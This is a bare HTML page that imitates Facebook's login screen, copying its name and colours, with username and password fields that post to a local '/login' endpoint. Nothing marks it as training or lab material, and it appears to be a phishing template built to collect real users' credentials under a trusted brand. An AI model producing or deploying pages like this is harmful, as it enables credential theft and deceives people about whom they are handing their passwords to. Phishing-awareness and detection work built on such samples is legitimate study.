<!DOCTYPE html>
<html>
<head><title>Facebook Login</title></head>
<body style="font-family:Arial; background-color:#f0f2f5;">
  <div style="width:300px; margin:auto; padding:20px; background:white; margin-top:100px; box-shadow:0 0 10px #aaa;">
    <h2 style="color:#1877f2;">Facebook</h2>
    <form method="POST" action="/login">
      <input type="text" name="username" placeholder="Email or Phone" style="width:100%; padding:10px;"><br><br>
      <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px;"><br><br>
      <input type="submit" value="Log In" style="width:100%; padding:10px; background-color:#1877f2; color:white; border:none;">
    </form>
  </div>
</body>
</html>
